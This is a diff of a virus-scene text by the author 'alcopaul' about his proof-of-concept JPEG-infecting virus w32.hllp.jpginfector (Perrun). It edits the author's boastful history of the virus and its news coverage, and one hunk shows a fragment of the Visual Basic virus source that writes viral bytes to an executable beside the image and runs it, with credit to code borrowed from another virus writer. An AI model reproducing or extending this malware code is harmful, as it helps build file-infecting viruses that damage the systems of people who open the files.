@@ -7,10 +7,10 @@ source in ebcvg #2...
 
 history
 --------
-w32.hllp.jpginfector, as i named my proof-of-concept virus, was written on a fine afternoon of june 13, 2002 because
-i just wanted to make a working proof of my article "Infecting Picture Files : A Desperate Approach"... that article
-was written because of my song "Sa Iyong Pagibig" dedicated to my Goddess partner... 
-so the root of all the Perrun phenomenon was not the eagerness to achieve fame... the root is LOVE... "Hi Yelena!" :)
+w32.hllp.jpginfector, as i named my lame proof-of-concept virus, was written on a fine afternoon of june 13, 2002 because
+i just wanted to make a working proof of my article "Infecting Picture Files : A Desperate Approach"... that lame article
+was written because of my reggae song "Your Kiss, Your Love and Some Pictures" dedicated to my girlfriend... 
+so the root of all the Perrun phenomenon was not the eagerness to achieve fame... the root is LOVE... "Hi Janis!" :)
 
 after the finishing touches to the binary, i submitted it to av sites... trend, symantec, mcafee.. (can't clearly remember
 if i submitted it to avp, f-secure and sophos).... then i rested and ate my dinner.... i checked my mail again then
@@ -130,13 +130,13 @@ can't please everybody.. there exist many criticisms about this virus... i read 
 but i don't care..
 
 
-final thought : this is a virus that "shook" the news for one time...
+final thought : this is a lame virus that "shook" the news for one time...
 
 enjoy..
 
 alcopaul
-[NIHFEX][4028PloT][0928PULSAR][Brigada Ocho][w32.perrun]
-03/28/2016
+
+indirect thanks to murkry.. i borrowed the spawned host execution routine from his vb virus...
 
 =========================
 virus
@@ -305,6 +305,7 @@ Open jpgvir & "x.exe" For Binary Access Write As #ffile
 Put #ffile, , vircode
 Close #ffile
 DoEvents
+'borrowed from murkry's vb5 virus
 idProg = Shell(jpgvir & "x.exe", vbNormalFocus)
 hProg = OpenProcess(PROCESS_ALL_ACCESS, False, idProg)
 GetExitCodeProcess hProg, iExit
